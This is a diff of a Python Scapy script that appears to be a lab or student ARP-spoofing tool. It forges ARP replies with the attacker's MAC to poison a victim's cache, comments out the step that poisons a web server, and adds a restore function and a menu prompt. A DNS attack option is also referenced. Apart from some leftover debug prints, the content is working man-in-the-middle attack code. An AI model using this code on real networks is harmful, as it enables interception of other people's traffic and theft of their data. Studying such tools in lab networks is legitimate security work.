@@ -14,11 +14,7 @@ SERVER_IP = "192.168.56.102"
 SERVER_MAC = '08:00:27:CC:08:6F'
 ATTACKER_MAC = get_mac_address(interface=Net_Interface)
 
-def arp(VICTIM_MAC, VICTIM_IP):
-	print(ATTACKER_MAC)
-	
-		
-				
+def arp(VICTIM_MAC, VICTIM_IP):	
 	arp= Ether() / ARP()
 	arp[Ether].src = ATTACKER_MAC
 	arp[ARP].hwsrc = ATTACKER_MAC
@@ -29,19 +25,41 @@ def arp(VICTIM_MAC, VICTIM_IP):
 	sendp(arp, iface=Net_Interface)
 
 	#Poison the Linux Webserver
-	arp= Ether() / ARP()
+	#arp= Ether() / ARP()
+	#arp[Ether].src = ATTACKER_MAC
+	#arp[ARP].hwsrc = ATTACKER_MAC
+	#arp[ARP].psrc = VICTIM_IP
+	#arp[ARP].hwdst = SERVER_MAC
+	#arp[ARP].pdst = SERVER_IP
+
+	#sendp(arp, iface=Net_Interface)
+
+	print("Pisoned the ARP of the following IPs: " + VICTIM_IP +" and "+ SERVER_IP);
+    	
+	return
+	
+def restore_arp(VICTIM_MAC, VICTIM_IP):
+	print("aaa:")
+	arp = Ether() / ARP()
 	arp[Ether].src = ATTACKER_MAC
-	arp[ARP].hwsrc = ATTACKER_MAC
+	arp[Ether].dst = SERVER_MAC
+	arp[ARP].hwsrc = VICTIM_MAC
 	arp[ARP].psrc = VICTIM_IP
 	arp[ARP].hwdst = SERVER_MAC
 	arp[ARP].pdst = SERVER_IP
-
 	sendp(arp, iface=Net_Interface)
-
-	poisonedIPs = [VICTIM_IP, SERVER_IP]
-	print("(ARP) Re-poisoned the ARP of the following IPs: " + str(poisonedIPs));
-	time.sleep(14)
-    	
+        
+	print("panana")
+        
+	#arp = Ether() / ARP()
+	#arp[Ether].src = ATTACKER_MAC
+	#arp[Ether].dst = VICTIM_MAC
+	#arp[ARP].hwsrc = SERVER_MAC
+	#arp[ARP].psrc = SERVER_IP
+	#arp[ARP].hwdst = VICTIM_MAC
+	#arp[ARP].pdst = VICTIM_IP
+	#sendp(arp, iface=Net_Interface)
+	print("asda")
 	return
 
 print("Want to scan for all connected devices in the network? (Y/N)")
@@ -77,6 +95,10 @@ attack_to_perform = input()
 
 if attack_to_perform == "1":
 	arp(VICTIM_MAC, VICTIM_IP)
+	print("would you like to restore the ARP once attack is finished? (Y/N)")
+	choice = input()
+	if choice == "y" or choice == "Y" or choice == "yes" or choice =="YES":
+		restore_arp(VICTIM_MAC, VICTIM_IP)
 	
 elif attack_to_perform == "2":
 	dns()
